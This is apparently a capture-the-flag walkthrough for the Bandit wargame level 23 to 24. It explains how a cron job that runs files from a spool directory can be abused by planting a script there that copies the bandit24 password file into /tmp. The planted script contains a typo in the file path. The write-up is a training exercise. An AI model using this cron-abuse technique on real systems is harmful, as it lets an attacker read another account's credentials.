```bash
cd /etc/cron.d
```
- check for cron jobs 

```bash
cat cronjob_bandit24
```

```
null

```


```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

```

- The script executes and deletes all files in `/var/spool/bandit24/foo`. This is the case because it is run as `bandit24`
- The for loop goes through the files but checks `.` and `..` are skipped
- Inner if statement is execute if the owner of the file is `bandit23`
	- Exploiting this feature, we can insert a script that can cat `/etc/bandit_pass/bandit24` to a file in `/tmp`

```bash
mkdir -p /tmp/bacon
```

```bash
cd /tmp/bacon
```

```bash
touch spy.sh
```

```bash
chmod 777 spy.sh
```
- Change permissions of the shell to allow `bandit24` to run the script

```bash
vim spy.sh
```

```bash
#!/bin/bash

cat /etc/bandit_pass/bandi24 > /tmp/bacon/password
```

```bash
touch password
chmod 666 password
```
- Set permission of the password file which allows everyone to write information to the file

```bash
cp spy.sh /var/spool/bandit24/foo
```
- Copy the script to `/var/spool/bandit24` and wait for the script running automatically in a minute

```bash
cat /tmp/bacon/password
```
